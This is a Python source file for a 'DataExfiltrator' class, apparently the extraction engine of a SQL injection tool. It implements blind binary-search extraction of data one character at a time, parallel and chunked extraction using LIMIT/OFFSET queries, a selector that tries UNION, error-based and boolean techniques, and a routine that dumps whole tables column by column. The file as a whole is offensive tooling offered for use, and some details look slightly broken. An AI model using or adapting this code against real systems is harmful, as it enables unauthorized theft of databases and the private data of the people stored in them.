"""
Advanced Data Exfiltrator with adaptive binary search, chunked extraction, and parallel engines
"""

import asyncio
import base64
import math
import re
import time
from typing import Any, Callable, Dict, List, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed


@dataclass
class ExtractionResult:
    data: str
    technique: str
    confidence: float
    chars_per_sec: float
    total_requests: int
    duration: float
    raw_responses: List[str] = None


class DataExfiltrator:
    def __init__(self, request_func: Callable):
        self.request = request_func
        self.charsets = {
            "all": " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.!@#$%^&*()+=,./;:<>?|~",
            "alnum": "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
            "alpha": "_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
            "numeric": "0123456789",
            "hex": "0123456789ABCDEF",
            "base64": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            "common": "_abcdefghijklmnopqrstuvwxyz0123456789",
            "mysql_extra": " !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~\t\n\r",
            "json": "\"{}[]:,-.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_",
            "xml": "<>/=\"'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.: \t\n",
        }

    # ── Length Detection ──────────────────────────────────────────

    def detect_length(self, test_func: Callable[[int], bool], max_len: int = 255) -> int:
        """Binary search for data length"""
        low, high = 0, max_len
        while low < high:
            mid = (low + high) // 2
            if test_func(mid):
                high = mid
            else:
                low = mid + 1
        return low

    # ── Binary Search Extraction ──────────────────────────────────

    def extract_binary(self, test_func: Callable[[str, int], bool],
                       charset: str = None, length: int = None,
                       max_len: int = 255) -> ExtractionResult:
        """Extract data using binary search over charset"""
        start = time.time()
        charset = charset or self.charsets["common"]
        req_count = 0

        if length is None:
            length = self.detect_length(
                lambda l: test_func(self._length_payload(l), 0), max_len
            )
            req_count += int(math.log2(max_len)) * 2

        result = []
        for pos in range(length):
            low, high = 0, len(charset) - 1
            while low <= high:
                mid = (low + high) // 2
                char = charset[mid]
                if test_func(char, pos):
                    high = mid - 1
                else:
                    low = mid + 1
                req_count += 2

            char_idx = min(low, len(charset) - 1)
            result.append(charset[char_idx])

        data = "".join(result)
        duration = time.time() - start
        cps = len(data) / duration if duration > 0 else 0

        return ExtractionResult(
            data=data.strip(),
            technique="binary_search",
            confidence=0.95,
            chars_per_sec=round(cps, 2),
            total_requests=req_count,
            duration=round(duration, 3)
        )

    def _length_payload(self, length: int) -> str:
        return f"LENGTH(@)<=%d" % length

    # ── Parallel Binary Search ────────────────────────────────────

    def extract_parallel(self, test_func: Callable[[str, int], bool],
                         charset: str = None, max_len: int = 255,
                         workers: int = 5) -> ExtractionResult:
        """Extract data with parallel binary search per position"""
        start = time.time()
        charset = charset or self.charsets["common"]

        length = self.detect_length(
            lambda l: test_func(self._length_payload(l), 0), max_len
        )

        results = [""] * length

        def extract_pos(pos: int) -> Tuple[int, str]:
            low, high = 0, len(charset) - 1
            while low <= high:
                mid = (low + high) // 2
                if test_func(charset[mid], pos):
                    high = mid - 1
                else:
                    low = mid + 1
            char_idx = min(low, len(charset) - 1)
            return pos, charset[char_idx]

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(extract_pos, p): p for p in range(length)}
            for future in as_completed(futures):
                pos, char = future.result()
                results[pos] = char

        data = "".join(results)
        duration = time.time() - start
        cps = len(data) / duration if duration > 0 else 0

        return ExtractionResult(
            data=data.strip(),
            technique=f"parallel_binary_{workers}w",
            confidence=0.98,
            chars_per_sec=round(cps, 2),
            total_requests=length * int(math.log2(len(charset))),
            duration=round(duration, 3)
        )

    # ── Chunked Extraction ────────────────────────────────────────

    def extract_chunked(self, query_builder: Callable[[int, int], str],
                        response_parser: Callable[[str], str],
                        chunk_size: int = 50, max_chunks: int = 1000) -> ExtractionResult:
        """Extract data in chunks (e.g., SUBSTR/GROUP_CONCAT with LIMIT)"""
        start = time.time()
        all_data = []
        total_req = 0

        for chunk_idx in range(max_chunks):
            offset = chunk_idx * chunk_size
            query = query_builder(offset, chunk_size)
            response = self.request(query)

            total_req += 1
            data = response_parser(response)

            if not data or len(data) == 0:
                break

            all_data.append(data)

            if len(data) < chunk_size:
                break

        result = "".join(all_data)
        duration = time.time() - start
        cps = len(result) / duration if duration > 0 else 0

        return ExtractionResult(
            data=result.strip(),
            technique=f"chunked_{chunk_size}",
            confidence=0.9,
            chars_per_sec=round(cps, 2),
            total_requests=total_req,
            duration=round(duration, 3)
        )

    # ── Regex Extraction ──────────────────────────────────────────

    def extract_regex(self, query: str, pattern: str,
                      flags: int = re.DOTALL) -> ExtractionResult:
        """Extract data using regex patterns from response"""
        start = time.time()
        response = self.request(query)
        duration = time.time() - start

        matches = re.findall(pattern, response, flags)
        data = "\n".join(matches) if matches else ""

        return ExtractionResult(
            data=data,
            technique="regex_extract",
            confidence=0.85 if data else 0,
            chars_per_sec=round(len(data) / duration, 2) if duration > 0 else 0,
            total_requests=1,
            duration=round(duration, 3),
            raw_responses=[response[:500]]
        )

    # ── Multi-Technique Extraction ────────────────────────────────

    def extract_smart(self, query: str, dbms: str, blind_func: Callable = None,
                      error_func: Callable = None, union_func: Callable = None) -> ExtractionResult:
        """Try multiple extraction techniques and return best result"""
        results = []

        if union_func:
            try:
                res = union_func(query)
                if res and res.data:
                    res.technique = "UNION"
                    results.append(res)
            except Exception:
                pass

        if error_func:
            try:
                res = error_func(query)
                if res and res.data:
                    res.technique = "ERROR"
                    results.append(res)
            except Exception:
                pass

        if blind_func:
            try:
                res = blind_func(query)
                if res and res.data:
                    res.technique = "BOOLEAN"
                    results.append(res)
            except Exception:
                pass

        if not results:
            return ExtractionResult(
                data="", technique="NONE", confidence=0,
                chars_per_sec=0, total_requests=0, duration=0
            )

        return max(results, key=lambda r: (r.confidence, len(r.data)))

    # ── Batch Extraction ──────────────────────────────────────────

    def extract_batch(self, queries: List[str], parser: Callable[[str], str],
                      parallel: bool = True, max_workers: int = 5) -> List[ExtractionResult]:
        """Extract multiple queries in parallel"""
        if not parallel:
            results = []
            for q in queries:
                results.append(self.extract_regex(q, ".*"))
            return results

        results = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.extract_regex, q, ".*"): q for q in queries}
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception:
                    pass
        return results

    # ── Full Database Extraction ──────────────────────────────────

    def extract_database(self, db_name: str, table_names: List[str],
                         column_names: List[str], batch_size: int = 50) -> Dict[str, List[ExtractionResult]]:
        """Orchestrate full database extraction"""
        all_results = {}

        for tbl in table_names:
            tbl_results = []
            for col in column_names:
                query = f"SELECT {col} FROM {db_name}.{tbl}"
                res = self.extract_chunked(
                    lambda o, s: f"SELECT {col} FROM {db_name}.{tbl} LIMIT {s} OFFSET {o}",
                    lambda r: r.strip() if r else "",
                    chunk_size=batch_size
                )
                tbl_results.append(res)
            all_results[tbl] = tbl_results

        return all_results

    # ── Adaptive Charset Detection ────────────────────────────────

    def detect_charset(self, test_func: Callable[[str], bool],
                       candidates: List[str] = None) -> str:
        """Test which charset works best"""
        candidates = candidates or list(self.charsets.keys())
        best_name, best_score = candidates[0], 0

        for name in candidates:
            cs = self.charsets[name]
            score = sum(1 for c in cs[:5] if test_func(c))
            if score > best_score:
                best_score = score
                best_name = name

        return best_name
